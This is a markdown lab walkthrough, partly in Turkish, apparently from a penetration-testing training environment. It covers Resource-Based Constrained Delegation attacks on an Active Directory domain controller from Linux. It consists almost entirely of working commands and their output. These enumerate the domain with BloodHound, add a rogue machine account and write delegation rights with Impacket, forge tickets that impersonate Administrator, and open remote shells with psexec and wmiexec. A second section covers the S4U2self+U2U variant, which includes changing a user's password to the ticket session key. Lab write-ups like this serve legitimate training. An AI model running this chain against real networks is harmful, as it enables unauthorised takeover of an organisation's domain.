# RBCD from Linux

## Hosts File

```sh
my@attack:~$ echo "10.129.180.71 inlanefreight.local dc01.inlanefreight.local" | sudo tee -a /etc/hosts
```

## Enumeration

### BloodHound Data Collection

```sh
my@attack:~$ bloodhound-python -d INLANEFREIGHT.LOCAL -u 'carole.holmes' -p 'Y3t4n0th3rP4ssw0rd' --nameserver 10.129.180.71 -c all --kerberos
```

```output title="Output"
INFO: Found AD domain: inlanefreight.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.inlanefreight.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 5 computers
INFO: Connecting to GC LDAP server: dc01.inlanefreight.local
INFO: Connecting to LDAP server: dc01.inlanefreight.local
INFO: Found 24 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: FILER01.INLANEFREIGHT.LOCAL
INFO: Querying computer: WS01.INLANEFREIGHT.LOCAL
INFO: Querying computer: SQL01.INLANEFREIGHT.LOCAL
INFO: Querying computer: DMZ01.INLANEFREIGHT.LOCAL
INFO: Querying computer: DC01.INLANEFREIGHT.LOCAL
WARNING: Could not resolve: FILER01.INLANEFREIGHT.LOCAL: The DNS query name does not exist: FILER01.INLANEFREIGHT.LOCAL.
WARNING: Could not resolve: SQL01.INLANEFREIGHT.LOCAL: The DNS query name does not exist: SQL01.INLANEFREIGHT.LOCAL.
WARNING: Could not resolve: WS01.INLANEFREIGHT.LOCAL: The DNS query name does not exist: WS01.INLANEFREIGHT.LOCAL.
WARNING: Could not resolve: DMZ01.INLANEFREIGHT.LOCAL: The DNS query name does not exist: DMZ01.INLANEFREIGHT.LOCAL.
INFO: Done in 00M 54S
```

### Zip Output Files

```sh
my@attack:~$ zip -r inlanefreight.zip *.json
```

### Raw Query

```cypher title="Query"
MATCH p=allShortestPaths((n:User)-[r:GenericWrite|GenericAll|WriteProperty|WriteDacl*1..]->(c:Computer))
RETURN p
```

## Creating a Computer with [Impacket](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py)

```sh
my@attack:~$ addcomputer.py 'INLANEFREIGHT.LOCAL'/'carole.holmes':'Y3t4n0th3rP4ssw0rd' -dc-ip 10.129.180.71 -computer-name 'ATTACK$' -computer-pass 'Password123!'
```

```output title="Output"
[*] Successfully added machine account ATTACK$ with password Password123!.
```

## Adding the Computer to the Target Trust List

```sh
my@attack:~$ rbcd.py 'INLANEFREIGHT.LOCAL'/'carole.holmes':'Y3t4n0th3rP4ssw0rd' -dc-ip 10.129.180.71 -delegate-from 'ATTACK$' -delegate-to 'DC01$' -action 'write'
```

```output title="Output" hl_lines="3"
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ATTACK$ can now impersonate users on DC01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ATTACK$      (S-1-5-21-1870146311-1183348186-593267556-4103)
```

## Crafting a TGS Ticket

```sh
my@attack:~$ getST.py 'INLANEFREIGHT.LOCAL'/'ATTACK':'Password123!' -impersonate Administrator -spn cifs/DC01.INLANEFREIGHT.LOCAL -dc-ip 10.129.180.71
```

```output title="Output" hl_lines="6"
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache
```

## Using the Ticket

```sh
my@attack:~$ export KRB5CCNAME='Administrator@cifs_DC01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache'
my@attack:~$ psexec.py 'INLANEFREIGHT.LOCAL'/'Administrator'@DC01.INLANEFREIGHT.LOCAL -k -no-pass
```

## [MS-DS-Machine-Account-Quota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota) Set to Zero

!!! abstract

    Bu yöntem aşağıda verilen sınırlamalar mevcut olduğunda tercih edilebilir:

    * SPN içeren bir nesne üzerinde kontrol sahibi olunamıyor.
    * Sahte bir bilgisayar oluşturulamıyor.

### Password to NT Hash

!!! warning

    Beth Richards hesabı daha önceden ele geçirildi.

```sh
my@attack:~$ pypykatz crypto nt 'B3thR!ch@rd$'
```

```output title="Output"
de3d16603d7ded97bb47cd6641b1a392
```

### Obtaining a TGT

```sh
my@attack:~$ getTGT.py 'INLANEFREIGHT.LOCAL'/'beth.richards' -hashes :DE3D16603D7DED97BB47CD6641B1A392 -dc-ip 10.129.180.71
```

```output title="Output"
[*] Saving ticket in beth.richards.ccache
```

### Obtaining the Ticket Session Key

```sh
my@attack:~$ describeTicket.py beth.richards.ccache | grep 'Ticket Session Key'
```

```output title="Output"
[*] Ticket Session Key            : 6B53632DD7D17771377FCFD1CE56E24B
```

### Changing User Password

```sh
my@attack:~$ changepasswd.py 'INLANEFREIGHT.LOCAL'/'beth.richards'@10.129.180.71 -hashes :DE3D16603D7DED97BB47CD6641B1A392 -newhash :6B53632DD7D17771377FCFD1CE56E24B
```

```output title="Output" hl_lines="3"
[*] Changing the password of INLANEFREIGHT.LOCAL\beth.richards
[*] Connecting to DCE/RPC as INLANEFREIGHT.LOCAL\beth.richards
[*] Password was changed successfully.
[!] User will need to change their password on next logging because we are using hashes.
```

### Requesting a TGS Ticket

```sh
my@attack:~$ export KRB5CCNAME='beth.richards.ccache'
my@attack:~$ getST.py 'INLANEFREIGHT.LOCAL'/'beth.richards' -u2u -impersonate Administrator -spn termsrv/DC01.INLANEFREIGHT.LOCAL -dc-ip 10.129.180.71 -no-pass
```

```output title="Output" hl_lines="4"
[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@termsrv_DC01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache
```

### Remote Access

```sh
my@attack:~$ export KRB5CCNAME='Administrator@termsrv_DC01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache'
my@attack:~$ wmiexec.py DC01.INLANEFREIGHT.LOCAL -k -no-pass
```
